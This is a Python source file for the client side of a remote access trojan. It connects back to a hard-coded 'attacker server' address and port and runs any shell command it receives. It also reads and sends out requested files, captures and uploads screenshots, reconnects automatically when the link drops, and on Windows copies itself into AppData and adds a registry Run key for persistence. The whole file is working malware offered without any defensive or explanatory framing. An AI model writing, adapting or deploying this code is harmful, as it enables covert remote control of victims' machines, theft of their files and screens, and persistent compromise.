import os
import shutil
import subprocess
import sys

from command_payload import CommandPayload
from command_payload import parse_payload_to_output
from secure_socket import SecureSocket

# Attacker server ip and port
ip = "192.168.1.215"
port = 7890

exit_flag = False


# Custom command behaviour
def run_custom_command(cmd: str) -> CommandPayload:
    global exit_flag

    result = CommandPayload()
    if cmd[1] == "exit" or cmd[1] == "exit_full":
        exit_flag = True
        result.stdout = "Session ended"
        if cmd[1] == "exit_full":
            sys.exit(0)
    elif cmd[1] == "file":
        file_name = cmd[2]
        try:
            with open(file_name, 'rb') as file:
                file_data = file.read()
                result.file = file_data
                result.file_name = file_name
        except:
            result.stderr = "Cannot open file " + file_name
    elif cmd[1] == "screen":
        try:
            import mss
            with mss.mss() as sct:
                file_name = sct.shot(mon=-1)
                sct.save(file_name)
            with open(file_name, 'rb') as file:
                file_data = file.read()
                result.file = file_data
                result.file_name = file_name
            os.remove(file_name)
        except:
            result.stderr = "Cannot take screenshot"
    return result


# Create the victim socket that keep trying to connect to the server
def create_socket():
    global exit_flag
    global ip
    global port
    secure_socket = SecureSocket()
    secure_socket.connect(ip, port)
    while True:
        # Receive data from the server
        payload = secure_socket.receive(parse_payload_to_output)
        if type(payload) is not CommandPayload:
            if len(payload) == 0:
                print("Connection lost")
                secure_socket.close()
                create_socket()
            else:
                continue
        # Parse received data
        command = payload.command
        print('Received:'.center(40, "="))
        print(command)

        # Parse custom commands
        if command[0] == "->":
            payload = run_custom_command(command)
        else:
            # Generate command
            payload = run_command(command)
        print(payload)
        packet = payload.pack()

        if not secure_socket.send(packet):
            print("Connection lost")
            create_socket()

        if exit_flag:
            print(exit_flag)
            secure_socket.close()
            create_socket()



# Run a line of shell command and returns the result
# Todo: Keep one subprocess alive
def run_command(cmd):
    result = ["", ""]
    if cmd[0] == "cd":
        if len(cmd) > 1:
            try:
                os.chdir(cmd[1])
            except:
                result[1] = "No such directory"
    else:
        cmd = " ".join(cmd)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
    payload = CommandPayload(stdout=result[0], stderr=result[1])
    return payload

def clone_self():
    if os.name == "nt":
        # Clone and start up on windows
        path = os.environ["AppData"] + "\\PopcorenShell.exe"
        if not os.path.exists(path):
            shutil.copyfile(sys.executable, path)
            cmd = f"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v PopcornShell /t REG_SZ /d \"{path}\""
            subprocess.call(cmd, shell=True)


def main():
    clone_self()
    create_socket()


if __name__ == '__main__':
    main()
